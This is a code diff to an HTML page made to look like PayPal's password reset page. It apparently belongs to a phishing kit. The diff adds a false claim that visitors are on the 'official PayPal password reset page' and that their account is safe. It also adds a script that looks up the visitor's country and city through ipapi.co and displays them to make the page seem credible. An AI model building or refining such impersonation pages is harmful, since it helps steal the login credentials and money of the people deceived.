@@ -176,6 +176,12 @@
       <span class="logo-text">PayPal</span>
     </div>
   </header>
+  <!-- Middle User Info Section -->
+  <div class="user-info" id="user-info" style="text-align: center; margin: 30px 0; font-size: 15px; color: #555;">
+    <span id="country">Country: Loading...</span>
+    <span id="city">City: Loading...</span>
+    <span id="time">Local Time: Loading...</span>
+  </div>
 
   <!-- Main Reset Password Container -->
   <main class="reset-password-container">
@@ -222,6 +228,11 @@
       <!-- Submit Button -->
       <button type="submit" class="btn btn-primary" id="resetPasswordBtn">Approve Reset Password</button>
     </form>
+    <!-- Bottom Reassurance Text -->
+  <div class="footer-text" style="text-align:center; margin-top: 30px; font-size: 14px; color: #666;">
+    You are on the official PayPal password reset page. Rest assured, your account is safe and secure.
+  </div>
+    
   </main>
 
   <!-- Footer -->
@@ -257,6 +268,23 @@
 
 <!-- ✅ Your main dashboard JS -->
 <script src="script.js"></script>
+
+<!-- Fetch User Data Script -->
+<script>
+async function fetchUserData() {
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    const data = await res.json();
+
+    document.getElementById('country').textContent = `Country: ${data.country_name || 'N/A'}`;
+    document.getElementById('city').textContent = `City: ${data.city || 'N/A'}`;
+    document.getElementById('time').textContent = `Local Time: ${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}`;
+  } catch(err) {
+    console.log('Error fetching user data', err);
+  }
+}
+fetchUserData();
+</script>
   
 </body>
 </html>
